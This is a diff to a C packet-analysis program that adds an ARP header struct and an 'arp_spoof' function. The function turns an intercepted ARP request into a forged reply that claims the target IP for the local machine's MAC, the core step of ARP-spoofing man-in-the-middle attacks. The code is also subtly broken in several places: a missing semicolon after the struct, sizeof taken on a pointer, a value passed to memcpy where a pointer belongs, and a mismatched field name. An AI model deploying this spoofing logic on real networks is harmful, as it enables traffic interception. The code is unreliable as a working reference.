@@ -2,6 +2,7 @@
 #include <stdint.h>
 #include <netinet/if_ether.h> //for ETHERTYPE_IP and others
 #include <netinet/in.h> //for IPPROTO_TCP and others
+//#include <net/inet/arp.h> //for arp
 //for inet_ntoa()
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -26,6 +27,18 @@ struct Ip4_header{
 	uint8_t opt[40];
 };
 
+struct Arp_header{
+	uint16_t htype;
+	uint16_t ptype;
+	uint8_t hlen;
+	uint8_t plen;
+	uint16_t op;
+	uint8_t senderMAC[6];
+	uint32_t senderIP;
+	uint8_t targetMAC[6];
+	uint32_t targetIP;
+}
+
 struct Tcp_header{
 	uint16_t src_port;
 	uint16_t dst_port;
@@ -38,6 +51,46 @@ struct Tcp_header{
 	uint16_t urgp;
 	uint8_t opt[40];
 };
+
+
+
+int arp_spoof(char* out_packet, char* in_packet)
+{
+	struct Ethnet_header* eth_hp;
+	struct Arp_header* arp_hp;
+
+	eth_hp = in_packet;
+	if( ntohs((*eth_hp).type) != ETHERTYPE_ARP ){
+		return -1;
+	}
+	arp_hp = in_packet+sizeof(struct Ethnet_header);
+	if(!check_arp_type(arp_hp,1,0x0800,6,4)){
+		return -2;
+	}
+	if( (*arp_hp).op!=1 ){
+		return -3;
+	}
+	memset(out_packet,0,sizeof(out_packet));
+	memcpy(out_packet,(*eth_hp).srcMac,6);
+	memcpy(out_packet+6,(*eth_hp).dstMac,6);
+	memcpy(out_packet+12,htons(ETHERTYPE_ARP),2);
+	memcpy(out_packet+14,&((*arp_hp).htype),6); //copy original htype,ptype,hlen,plen
+	uint16_t ARPreply=htons(2);
+	memcpy(out_packet+20,&ARPreply,2); //op ARP reply
+	memcpy(out_packet+22,(*eth_hp).dstMac,6); //senderMAC = myMAC = org.eth.dstMAC
+	memcpy(out_packet+28,&((*arp_hp).targetIP),4); //senderIP = org.targetIP
+	memcpy(out_packet+32,(*arp_hp).senderMac,6); //targetMAC = org.senderMAC
+	memcpy(out_packet+38,&((*arp_hp).senderIP),4); //targetIP = org.senderIP
+	
+	return 1;
+}
+
+int check_arp_type(struct Arp_header* arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen ){
+	return ( ntohs(arph->htype) == htype && ntohs(arph->ptype) == ptype 
+	&& arph->hlen == hlen && arph->plen == plen);
+}
+
+
 
 int analyze_packet( char* packet )
 {
